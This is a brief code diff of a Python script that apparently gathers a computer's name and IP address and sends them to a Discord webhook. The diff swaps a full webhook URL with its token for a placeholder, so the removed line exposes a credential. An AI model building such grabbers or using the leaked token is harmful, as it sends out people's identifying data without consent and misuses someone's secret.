@@ -2,7 +2,7 @@ from dhooks import Webhook , File
 import socket
 from requests import get
 
-hook = Webhook("https://discord.com/api/webhooks/892315810696138782/oFCRoNI9hreoluc6JHcl9dDIXIS-Q6_0PWQJwVMgzNo8z080Yh-iGBITL1aq0m6tfpNA")
+hook = Webhook("WEBHOOK")
 
 
 # name + ip
